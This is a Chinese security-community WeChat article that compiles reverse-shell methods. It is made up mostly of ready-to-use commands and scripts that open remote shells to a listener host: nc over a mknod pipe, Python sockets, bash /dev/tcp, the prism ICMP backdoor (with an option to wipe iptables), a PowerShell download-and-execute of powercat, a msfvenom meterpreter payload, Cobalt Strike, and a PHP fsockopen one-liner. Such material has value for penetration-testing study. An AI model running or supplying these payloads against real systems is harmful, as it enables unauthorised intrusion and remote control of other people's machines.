> 本文由 [简悦 SimpRead](http://ksria.com/simpread/) 转码， 原文地址 [mp.weixin.qq.com](https://mp.weixin.qq.com/s/gswjUAkuAR1VFlks6rUKZw)

**作者：伟大宝宝** 编辑：白帽子社区运营团队  

  

  

    " 前言：为建设一个更加具有交流意义以及更开放的安全社区，白帽子社区公众号现在开始有偿收稿啦！更多具体信息请在公众号中回复 “投稿” 了解！

        白帽子社区 CTF 靶场（BMZCTF）已经开放，欢迎各位访问，在这里练习、学习，BMZCTF 全身心为网络安全赛手提供优质学习环境，链接（http://www.bmzclub.cn/）

"    

* * *

**本次整理了一些常用的反弹 shell 手段，供各位参考。**

![](https://mmbiz.qpic.cn/mmbiz_png/HQn53QYo2G7y8QibS9fFJ9YsS8Swpos3PVKlVFeB4odJ6vtHpd0LycDiaDYEj4n8ZD8DvtuAcgaP7OQfia9OD67gw/640?wx_fmt=png)

通过 mknod 创建管道反弹 shell

在 linux 下的 nc 中我们使用 -e 来反弹 shell 的时候会发现不存在 -e 参数。

![](https://mmbiz.qpic.cn/mmbiz_png/HQn53QYo2G5JUlowF5DoicMziaaMibpOwdT5ChcjxV1icOKmI5GPbFBlibdtTgeeFFolk70WwibolyjIzlV9NYicYKTBQ/640?wx_fmt=png)

在这种情况下可以通过创建管道，然后将默认 shell 环境的输入重定向给刚才创建的管道，最后将输出重定向到管道中。

```
mknod /tmp/bmz p
/bin/bash 0</tmp/bmz | nc 192.168.88.131 1234 1>/tmp/bmz
```

![](https://mmbiz.qpic.cn/mmbiz_png/HQn53QYo2G5JUlowF5DoicMziaaMibpOwdT14oicbzCicPkvRQ6R8QGG5ZRo5r51KB9Q3EgnbuhEyvaqcfIgJFcNGbQ/640?wx_fmt=png)

我们已经可以接收到反弹的 shell

![](https://mmbiz.qpic.cn/mmbiz_png/HQn53QYo2G5JUlowF5DoicMziaaMibpOwdTUdJWC4H9efazEntnK9EAqFIYygUdeTAJZjWhl9V6vRcppoIoFaf55A/640?wx_fmt=png)

![](https://mmbiz.qpic.cn/mmbiz_png/HQn53QYo2G7y8QibS9fFJ9YsS8Swpos3PVKlVFeB4odJ6vtHpd0LycDiaDYEj4n8ZD8DvtuAcgaP7OQfia9OD67gw/640?wx_fmt=png)

通过 Python 反弹 shell

同样我们也可以尝试使用 python，因为 linux 默认安装了 python

编写脚本

```
import socket,subprocess,os
s =socket.socket(socket.AF_INET,socket.SOCK_STREAM)
s.connect(( "192.168.88.131" , 1234 ))
os.dup2(s.fileno(), 0 )
os.dup2(s.fileno(), 1 )
os.dup2(s.fileno(), 2 )
p = subprocess.call([ "/bin/bash" , "-i" ])
```

运行即可接收到 shell

![](https://mmbiz.qpic.cn/mmbiz_png/HQn53QYo2G5JUlowF5DoicMziaaMibpOwdTtCrnnynCHyCia7wGKU5QtOjSBwqFzRhljyZ4QAo2sKJnpJKjuh9Zmgw/640?wx_fmt=png)

![](https://mmbiz.qpic.cn/mmbiz_png/HQn53QYo2G7y8QibS9fFJ9YsS8Swpos3PVKlVFeB4odJ6vtHpd0LycDiaDYEj4n8ZD8DvtuAcgaP7OQfia9OD67gw/640?wx_fmt=png)

通过 bash 反弹 shell

这是最为常用的一个反弹的方法

```
bash -i >& /dev/tcp/ip_address/port 0>&1
```

  

![](https://mmbiz.qpic.cn/mmbiz_png/HQn53QYo2G5JUlowF5DoicMziaaMibpOwdTAriaQ1LN8aGpFibIibiaUnlD6dFFlJjqAoeRv5ribiaU5lU23YNQEELVaILA/640?wx_fmt=png)

![](https://mmbiz.qpic.cn/mmbiz_png/HQn53QYo2G7y8QibS9fFJ9YsS8Swpos3PVKlVFeB4odJ6vtHpd0LycDiaDYEj4n8ZD8DvtuAcgaP7OQfia9OD67gw/640?wx_fmt=png)

通过 ICMP 反弹 shell

如果目标对流量协议进行了限制，也可以尝试采用 ICMP 协议进行反弹 shell。因为通常情况下不会对 ICMP 协议进行封禁。

首先下载 prism**（公众号首页回复：“prism” 获取下载地址）**

下载完后会有这几个文件

![](https://mmbiz.qpic.cn/mmbiz_png/HQn53QYo2G5JUlowF5DoicMziaaMibpOwdT7ntNWMbGjT4cqI1icv6bAcjfk62T9ERkSiaW1MoaglialhfS0PIJUA1rA/640?wx_fmt=png)

其中 prism.c 是我们需要编译的后门文件，sendPacket.py 用来触发后门，但是后门文件在我们编译前需要进行一下配置。

重点关注这几行

![](https://mmbiz.qpic.cn/mmbiz_png/HQn53QYo2G5JUlowF5DoicMziaaMibpOwdTB46EhtCJR8312quZJjlHeVPKZI3e46rcksFu9KllEgvcJl5KyoCRxg/640?wx_fmt=png)

其中

```
define REVERSE_HOST用来设置监听主机的IP地址
define REVERSE_PORT用来设置监听的端口
```

设置好以后上传到目标主机进行编译

编译的命令：

```
gcc <..OPTIONS..> -Wall -s -o prism prism.c
```

其中 OPTIONS 包含以下选项

```
-DDETACH         //后台运行
-DSTATIC          //只用STATIC模式（默认是ICMP模式）
-DNORENAME   //不再重命名进程名
-DIPTABLES     //清除所有iptables规则表项
```

使用

```
gcc -DDETACH -Wall -s -o prism prism.c
```

编译后门  

![](https://mmbiz.qpic.cn/mmbiz_png/HQn53QYo2G5JUlowF5DoicMziaaMibpOwdTJKWt3yuvDDXxPL8iabZcZgsIibszYnhypJwZaI4ENVHFM0kSIDWbdo3Q/640?wx_fmt=png)

之后运行编译好的后门文件。

然后去运行

这个时候去运行我们的 sendPacket.py

![](https://mmbiz.qpic.cn/mmbiz_png/HQn53QYo2G5JUlowF5DoicMziaaMibpOwdT0Fn9xvxGntj2mYKWdbuoJyczNtbwljKBqqicZcQWGrq1icwwYCkeiadXA/640?wx_fmt=png)

监听主机便会获取到反弹的 shell

![](https://mmbiz.qpic.cn/mmbiz_png/HQn53QYo2G5JUlowF5DoicMziaaMibpOwdTWssSibfFqEeFEEgzymp8s2eaSchQ4MQ7ckvbpdjp75toH67XGSL5Wibw/640?wx_fmt=png)

![](https://mmbiz.qpic.cn/mmbiz_png/HQn53QYo2G7y8QibS9fFJ9YsS8Swpos3PVKlVFeB4odJ6vtHpd0LycDiaDYEj4n8ZD8DvtuAcgaP7OQfia9OD67gw/640?wx_fmt=png)

PowerShell 反弹 shell

Windows 下的 powercat 反弹 shell

下载 powercat**（公众号回复：“powercat” 下载）**

命令格式

```
powershell IEX (New-ObjectSystem.Net.Webclient).DownloadString('http://192.168.1.38/powercat.ps1'); 
powercat -c ip_addr -p port -e cmd
```

  

![](https://mmbiz.qpic.cn/mmbiz_png/HQn53QYo2G5JUlowF5DoicMziaaMibpOwdT47VtMoHePiatxqMB1e4p6n71ic9f8p5U9YTXkgAgTkqeLMF1X1PibHZ4w/640?wx_fmt=png)

监听端获得反弹的 shell

![](https://mmbiz.qpic.cn/mmbiz_png/HQn53QYo2G5JUlowF5DoicMziaaMibpOwdTmKrRicTQbXdZkLq99KvXgib4icNCwyDElw68uR8wUwyEOiaIyOgvzR7lCQ/640?wx_fmt=png)

![](https://mmbiz.qpic.cn/mmbiz_png/HQn53QYo2G7y8QibS9fFJ9YsS8Swpos3PVKlVFeB4odJ6vtHpd0LycDiaDYEj4n8ZD8DvtuAcgaP7OQfia9OD67gw/640?wx_fmt=png)

MSF 生成后门反弹 shell

msf 以及 CS 的反弹 shell

```
msfvenom -p windows/meterpreter/reverse_tcp LHOST=195.1.7.23 LPORT=8888 -f exe > shell.exe
```

生成木马后使用 exploit/multi/handler 模块监听，选择对应后门的 payload，配置好参数后开启监听。

在目标服务器运行生成的后门文件后就可以上线。

![](https://mmbiz.qpic.cn/mmbiz_png/HQn53QYo2G7y8QibS9fFJ9YsS8Swpos3PVKlVFeB4odJ6vtHpd0LycDiaDYEj4n8ZD8DvtuAcgaP7OQfia9OD67gw/640?wx_fmt=png)

通过 Cobaltstrike 反弹 shell

比较简单直接截图

![](https://mmbiz.qpic.cn/mmbiz_png/HQn53QYo2G5JUlowF5DoicMziaaMibpOwdTQ9ibrXic9QfoJbBfjkPsrUHcibhQxISZNibAXV5kJ5DYicqmIfbAOmCQjMA/640?wx_fmt=png)

生成后门后上传到目标主机，运行后即可上线。

通过 PHP 反弹 shell

命令如下

```
php -r '$sock=fsockopen("192.168.1.38",1234);exec("/bin/sh -i <&3 >&3 2>&3");'
```

![](https://mmbiz.qpic.cn/mmbiz_png/HQn53QYo2G5JUlowF5DoicMziaaMibpOwdTap2UX8YttKAyfwpytYs2yaOp7qcJYxyN7f3xzBlSm9rSAJZzkA93Bg/640?wx_fmt=png)

往期精彩文章

  

  

  

  

**【往期推荐】**  

[未授权访问漏洞汇总](http://mp.weixin.qq.com/s?__biz=MzI1NTM4ODIxMw==&mid=2247484804&idx=2&sn=519ae0a642c285df646907eedf7b2b3a&chksm=ea37fadedd4073c87f3bfa844d08479b2d9657c3102e169fb8f13eecba1626db9de67dd36d27&scene=21#wechat_redirect)

[【内网渗透】内网信息收集命令汇总](http://mp.weixin.qq.com/s?__biz=MzI1NTM4ODIxMw==&mid=2247485796&idx=1&sn=8e78cb0c7779307b1ae4bd1aac47c1f1&chksm=ea37f63edd407f2838e730cd958be213f995b7020ce1c5f96109216d52fa4c86780f3f34c194&scene=21#wechat_redirect)  

[【内网渗透】域内信息收集命令汇总](http://mp.weixin.qq.com/s?__biz=MzI1NTM4ODIxMw==&mid=2247485855&idx=1&sn=3730e1a1e851b299537db7f49050d483&chksm=ea37f6c5dd407fd353d848cbc5da09beee11bc41fb3482cc01d22cbc0bec7032a5e493a6bed7&scene=21#wechat_redirect)  

[记一次 HW 实战笔记 | 艰难的提权爬坑](http://mp.weixin.qq.com/s?__biz=MzI1NTM4ODIxMw==&mid=2247484991&idx=2&sn=5368b636aed77ce455a1e095c63651e4&chksm=ea37f965dd407073edbf27256c022645fe2c0bf8b57b38a6000e5aeb75733e10815a4028eb03&scene=21#wechat_redirect)

[【超详细】Microsoft Exchange 远程代码执行漏洞复现【CVE-2020-17144】](http://mp.weixin.qq.com/s?__biz=MzI1NTM4ODIxMw==&mid=2247485992&idx=1&sn=18741504243d11833aae7791f1acda25&chksm=ea37f572dd407c64894777bdf77e07bdfbb3ada0639ff3a19e9717e70f96b300ab437a8ed254&scene=21#wechat_redirect)

[【超详细】Fastjson1.2.24 反序列化漏洞复现](http://mp.weixin.qq.com/s?__biz=MzI1NTM4ODIxMw==&mid=2247484991&idx=1&sn=1178e571dcb60adb67f00e3837da69a3&chksm=ea37f965dd4070732b9bbfa2fe51a5fe9030e116983a84cd10657aec7a310b01090512439079&scene=21#wechat_redirect)

[【超详细】CVE-2020-14882 | Weblogic 未授权命令执行漏洞复现](http://mp.weixin.qq.com/s?__biz=MzI1NTM4ODIxMw==&mid=2247485550&idx=1&sn=921b100fd0a7cc183e92a5d3dd07185e&chksm=ea37f734dd407e22cfee57538d53a2d3f2ebb00014c8027d0b7b80591bcf30bc5647bfaf42f8&scene=21#wechat_redirect)  

[【奇淫巧技】如何成为一个合格的 “FOFA” 工程师](http://mp.weixin.qq.com/s?__biz=MzI1NTM4ODIxMw==&mid=2247485135&idx=1&sn=f872054b31429e244a6e56385698404a&chksm=ea37f995dd40708367700fc53cca4ce8cb490bc1fe23dd1f167d86c0d2014a0c03005af99b89&scene=21#wechat_redirect)
---------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------

_**走过路过的大佬们留个关注再走呗**_![](https://mmbiz.qpic.cn/mmbiz_png/7D2JPvxqDTEATexewVNVf8bbPg7wC3a3KR1oG1rokLzsfV9vUiaQK2nGDIbALKibe5yauhc4oxnzPXRp9cFsAg4Q/640?wx_fmt=png)

**往期文章有彩蛋哦****![](https://mmbiz.qpic.cn/mmbiz_png/7D2JPvxqDTHtVfEjbedItbDdJTEQ3F7vY8yuszc8WLjN9RmkgOG0Jp7QAfTxBMWU8Xe4Rlu2M7WjY0xea012OQ/640?wx_fmt=png)**

![](https://mmbiz.qpic.cn/mmbiz_png/7D2JPvxqDTECbvcv6VpkwD7BV8iaiaWcXbahhsa7k8bo1PKkLXXGlsyC6CbAmE3hhSBW5dG65xYuMmR7PQWoLSFA/640?wx_fmt=png)

**分享前辈知识，一起学习共同进步！！如侵权请私聊公众号删文![](https://mmbiz.qpic.cn/mmbiz_png/7D2JPvxqDTHvn9mkHr2IDq5kEwPCgRujhTODPKjATDtE4qk0CydBmWFTcpib456YNCEvicv93MB9diavFXYqJV0UA/640?wx_fmt=png)**